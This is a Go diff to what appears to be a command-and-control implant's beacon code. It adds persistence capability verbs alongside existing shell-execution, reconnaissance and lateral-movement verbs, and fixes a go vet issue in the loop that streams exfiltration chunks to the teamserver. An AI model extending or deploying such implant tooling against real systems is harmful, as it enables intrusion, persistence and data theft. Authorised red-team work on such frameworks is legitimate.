@@ -25,8 +25,8 @@ import (
 
 // Caps are the capability verbs the reference implant advertises at handshake
 // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
-// shell verb, the three recon verbs the runner implements, and lateral.move so
-// a dispatched lateral task reaches the child-derivation handler.
+// shell verb, the three recon verbs the runner implements, the lateral.* set,
+// and the persist.* set so a dispatched persist task reaches its handler.
 var Caps = []string{
 	"shell.exec",
 	"recon.portscan",
@@ -35,6 +35,9 @@ var Caps = []string{
 	"lateral.move",
 	"lateral.token",
 	"lateral.exec_remote",
+	"persist.install",
+	"persist.remove",
+	"persist.list",
 }
 
 // EnrollBundle carries the inputs the lateral.move handler needs to derive a
@@ -199,10 +202,13 @@ func (b *Beacon) runOnce(ctx context.Context) error {
 		}
 		// Out-of-band exfil chunks follow the TaskResult on the same stream.
 		// Each carries the task id so the server reassembles and routes them to
-		// the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
-		for _, chunk := range chunks {
-			chunk.TaskId = task.GetTaskId()
-			chunkPayload, err := proto.Marshal(&chunk)
+		// the artifact store (architecture.md Sec 10.1 exfil, Sec 11). Iterate
+		// by index rather than ranging a copy: an ExfilChunk embeds a
+		// protoimpl.MessageState (which holds a sync.Mutex), so a value copy
+		// would lock the copy and trip `go vet`'s copylocks check.
+		for i := range chunks {
+			chunks[i].TaskId = task.GetTaskId()
+			chunkPayload, err := proto.Marshal(&chunks[i])
 			if err != nil {
 				b.log.Printf("marshal exfil chunk: %v", err)
 				break
